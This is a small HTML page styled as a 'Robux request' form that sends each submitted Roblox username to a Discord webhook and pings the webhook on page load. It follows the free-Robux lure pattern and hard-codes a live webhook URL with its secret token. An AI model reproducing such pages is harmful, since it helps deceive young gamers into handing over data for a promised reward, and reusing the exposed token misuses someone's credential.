<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Robux Request</title>
</head>
<body>
    <h1>Request Robux</h1>
    <form id="robux-form">
        <label for="username">Enter your Roblox Username:</label>
        <input type="text" id="username" name="username" required>
        <button type="submit">Submit</button>
    </form>

    <script>
        const webhookURL = 'https://discord.com/api/webhooks/1289959208032407614/_ziKdv8iCD3NDDCRxVJGF3RiphkWdOr0HbvmjdnDrrH96iqd0TCv_Wd3pqtvKKMQVKWV'; // Replace with your actual Discord webhook URL

        // Function to send a hello message to the webhook
        function sendHelloMessage() {
            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: 'Hello' }) // Message to send
            })
            .then(response => {
                if (response.ok) {
                    console.log('Hello message sent successfully!');
                } else {
                    console.error('Error sending hello message.');
                }
            })
            .catch(err => {
                console.error('Error sending hello message.', err);
            });
        }

        // Call the function when the page loads
        window.onload = sendHelloMessage;

        document.getElementById('robux-form').addEventListener('submit', function(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            sendToWebhook(username);
        });

        function sendToWebhook(username) {
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: `User requested Robux: ${username}` }) // Send username
            })
            .then(response => {
                if (response.ok) {
                    alert('Request sent successfully!');
                } else {
                    alert('Error sending request.');
                }
            })
            .catch(err => {
                alert('Error sending request.');
                console.error(err);
            });
        }
    </script>
</body>
</html>
